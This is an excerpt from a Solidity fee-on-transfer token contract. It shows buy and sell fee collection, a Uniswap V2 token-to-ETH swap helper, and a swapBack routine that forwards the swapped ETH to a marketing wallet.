1198                 fees = amount.mul(sellTotalFees).div(1000);
1199                 tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;
1200             }
1201             // on buy
1202             else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
1203                 fees = amount.mul(buyTotalFees).div(1000);
1204                 tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
1205             }
1206 
1207             if (fees > 0) {
1208                 super._transfer(from, address(this), fees);
1209             }
1210 
1211             amount -= fees;
1212         }
1213 
1214         super._transfer(from, to, amount);
1215     }
1216 
1217     function swapTokensForEth(uint256 tokenAmount) private {
1218         // generate the uniswap pair path of token -> weth
1219         address[] memory path = new address[](2);
1220         path[0] = address(this);
1221         path[1] = uniswapV2Router.WETH();
1222 
1223         _approve(address(this), address(uniswapV2Router), tokenAmount);
1224 
1225         // make the swap
1226         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1227             tokenAmount,
1228             0, // accept any amount of ETH
1229             path,
1230             address(this),
1231             block.timestamp
1232         );
1233     }
1234 
1235 
1236     function swapBack() private {
1237         uint256 contractBalance = balanceOf(address(this));
1238         uint256 totalTokensToSwap =
1239             tokensForMarketing;
1240         bool success;
1241 
1242         if (contractBalance == 0 || totalTokensToSwap == 0) {
1243             return;
1244         }
1245 
1246         if (contractBalance > swapTokensAtAmount * 20) {
1247             contractBalance = swapTokensAtAmount * 20;
1248         }
1249 
1250         // Halve the amount of liquidity tokens
1251 
1252         uint256 amountToSwapForETH = contractBalance;
1253 
1254         swapTokensForEth(amountToSwapForETH);
1255 
1256         tokensForMarketing = 0;
1257 
1258 
1259         (success, ) = address(marketingWallet).call{
1260             value: address(this).balance
1261         }("");
1262     }
1263 
1264 }